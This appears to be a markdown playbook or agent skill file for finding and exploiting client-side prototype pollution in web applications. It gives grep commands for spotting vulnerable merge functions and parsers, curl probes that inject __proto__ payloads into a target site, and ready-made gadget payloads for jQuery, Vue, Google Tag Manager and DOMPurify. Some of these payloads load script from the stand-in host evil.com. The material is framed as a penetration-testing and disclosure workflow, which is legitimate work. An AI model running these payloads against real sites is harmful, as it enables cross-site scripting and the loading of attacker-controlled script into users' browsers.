---
name: web-prototype-pollution-cspp
description: Client-Side Prototype Pollution (CSPP) discovery, gadget chain extraction, and DOM XSS exploitation.
playbook: web-security
pivots_to:
  - web-xss-polyglot-execution
  - web-cors-misconfiguration-bypass
---

# Web Client-Side Prototype Pollution (CSPP)

## Attack Vector Summary
Client-Side Prototype Pollution occurs when an application recursively merges, clones, or parses user input (query string parameters or JSON objects) into JavaScript objects without filtering properties such as `__proto__` or `constructor.prototype`. Once `Object.prototype` is polluted, any uninitialized property access in the application inherits the attacker's value, enabling gadget-based DOM XSS or client-side logic bypasses.

## Tactical Heuristics & Step-by-Step Flow

### 1. Sink, Merge Method & Parser Identification (R12)
Examine loaded JavaScript bundles for vulnerable deep merge methods and query string parsers:

```bash
# 1. Search for deep merge functions in JS bundles
grep -oP '(merge|assign|extend|clone|copy|mergeDeep|defaults|\$\.extend|_\.merge|Object\.assign)\s*[=(]' Recon/jsbundles/*.js 2>/dev/null | sort -u

# 2. Check query string parsers
grep -oP '(deparam|parseQuery|\$\.param|qs\.parse|queryString|URLSearchParams)' Recon/jsbundles/*.js 2>/dev/null | sort -u
```

### 2. Probing Injection Points (URL Query & JSON Body)
Test URL query parameters, hash fragments, and JSON API payloads:

```bash
# 1. URL Query String Probing
curl -s "https://target.com/page?__proto__[test]=polluted&__proto__.test=polluted&constructor[prototype][test]=polluted" | grep -c "polluted"

# 2. JSON POST Body Probing (API merge / update endpoints)
curl -s -X POST https://target.com/api/user/profile \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"polluted":true},"constructor":{"prototype":{"polluted":true}}}'
```

Verify in browser console or DOM inspector:
```javascript
console.log(window.polluted, Object.prototype.polluted);
```

### 3. Exploiting Gadget Chains (40+ Library Corpus)
Identify loaded libraries in JavaScript bundles and exploit corresponding gadget chains:

```bash
# Check if target uses libraries with known gadget chains
grep -oP '(jquery|lodash|vue|react|dompurify|recaptcha|hcaptcha|knockout|marionette)' Recon/jsbundles/*.js 2>/dev/null | sort -u
```

#### Canonical Gadget Payloads:
```json
# 1. jQuery Gadget (globalEval execution via polluted url property)
{"__proto__":{"url":"data:,alert(document.domain)"}}

# 2. Vue.js / Template Gadgets
{"__proto__":{"v-if":"alert(1)"}}

# 3. Google Tag Manager / Analytics Gadget
{"__proto__":{"custom_script_url":"//evil.com/xss.js"}}

# 4. DOMPurify Sanitization Bypass Gadget
{"__proto__":{"ALLOWED_TAGS":["script"],"ALLOWED_ATTR":["src"]}}
```

## Empirical Disclosed Report Patterns & High-Risk Matrices
| Vector / Pattern | Mechanism | Empirical Pattern | Expected Evidence Marker |
|---|---|---|---|
| Query Parser Deparam Injection | Query parser expands `__proto__[key]` into prototype | `?__proto__[src]=data:,alert(1)` | `Object.prototype.src` exists; script injected |
| JSON Deep Merge Pollute | Nested recursive merge assigns directly to proto | `{"__proto__":{"debug":1}}` | Client debugging or sensitive state rendered |
| Script Injection via Gadget | Library reads uninitialized config property | `{"__proto__":{"transport":"//evil.com"}}` | Network request dispatched to attacker host |

## Evidence Collection & Validation Gate
- Must capture console screenshot / DOM execution trace showing `Object.prototype` polluted.
- Provide step-by-step reproduction URL with payload demonstrating XSS or state manipulation.
- Evaluate against `/validate` 7-Question Validation Gate before reporting.
